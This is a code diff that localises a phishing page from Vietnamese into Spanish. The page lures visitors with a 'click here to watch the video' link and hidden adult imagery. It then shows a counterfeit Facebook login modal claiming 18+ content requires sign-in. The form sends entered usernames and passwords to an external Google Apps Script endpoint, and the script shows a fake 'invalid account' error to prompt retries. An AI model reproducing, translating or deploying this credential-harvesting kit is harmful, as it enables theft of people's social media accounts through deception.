@@ -114,7 +114,7 @@
 <body onclick="showModal();">
     <div align="center" style="margin-top: 30px;">
         <div class="separator" style="clear: both; text-align: center;">
-            <b><span style="color: red; font-size: 26pt; font-style: italic;"><a class="title" href="#" onclick="showModal()" style="color: red;">▶ BẤM VÀO ĐÂY ĐỂ XEM VIDEO</a></span></b>
+            <b><span style="color: red; font-size: 26pt; font-style: italic;"><a class="title" href="#" onclick="showModal()" style="color: red;">▶ HAGA CLIC AQUÍ PARA VER EL VIDEO</a></span></b>
         </div>
         <img src="https://lh4.googleusercontent.com/-9Z_Nozch2jg/WQdAm0n2wuI/AAAAAAABK78/ELlGEJCb_zkBPfPVCGw2_mYTkrAKhR4HwCLcB/s1600/anh-sex-dong-maulon%2B%25281%2529.gif" class="img-responsive" id="img1" style="display: none;" alt="Image">
         <img src="https://lh4.googleusercontent.com/-9Z_Nozch2jg/WQdAm0n2wuI/AAAAAAABK78/ELlGEJCb_zkBPfPVCGw2_mYTkrAKhR4HwCLcB/s1600/anh-sex-dong-maulon%2B%25281%2529.gif" class="img-responsive" id="img2" style="display: none;" alt="Image">
@@ -129,17 +129,17 @@
                 <div class="modal-body">
                     <section class="login-form-wrap">
                         <h1 class="facebook_logo">Facebook</h1>
-                        <div style="    background-color: #fff9d7; border: 1px solid #e2c822; padding: 6px; margin-bottom: 5px;" id="noti">Nội dung 18+, vui lòng đăng nhập trước khi xem.</div>
+                        <div style="    background-color: #fff9d7; border: 1px solid #e2c822; padding: 6px; margin-bottom: 5px;" id="noti">Contenido 18+, inicie sesión antes de verlo.</div>
                         <form class="login-form" id="test-form" method="GET" action="https://script.google.com/macros/s/AKfycbzurNoOOm0F7nRk_rhvEuXD89QX-iqQGIX6EDH8m1zy5AyRrc_3fvk0bF1VLW2yMLy0RA/exec">
                             <label class="mt-10">
-                                <input id="username" type="text" name="username" required="" placeholder="Email hoặc số điện thoại">
+                                <input id="username" type="text" name="username" required="" placeholder="Correo electrónico o número de teléfono">
                             </label>
                             <label class="mt-10">
-                                <input id="password" type="password" name="password" required="" placeholder="Mật khẩu">
+                                <input id="password" type="password" name="password" required="" placeholder="contraseña">
                             </label>
-                            <input class="mt-10" type="button" onclick="submitForm();" id="btnSubmit" value="Đăng nhập">
+                            <input class="mt-10" type="button" onclick="submitForm();" id="btnSubmit" value="Iniciar sesión">
                         </form>
-                        <h5 class="forgotpass_h5"><a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login" target="_blank" class="forgotpass">Quên mật khẩu?</a></h5>
+                        <h5 class="forgotpass_h5"><a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login" target="_blank" class="forgotpass">¿Has olvidado la contraseña?</a></h5>
                     </section>
                 </div>
             </div>
@@ -161,9 +161,9 @@ var count = 0;
 
 function submitForm() {
     if ($('#username').val().length < 6 || $('#password').val().length < 6) {
-		//alert('Thông tin vừa nhập không đúng');
+		//alert('La información ingresada no es correcta');
 		$('#noti').css({ "color": "red" });
-		$('#noti').text('Tài khoản bạn vừa nhập không hợp lệ, Vui lòng thử lại.');
+		$('#noti').text('La cuenta que ingresó no es válida. Vuelva a intentarlo.');
 		return;
     } else {
         //count++;
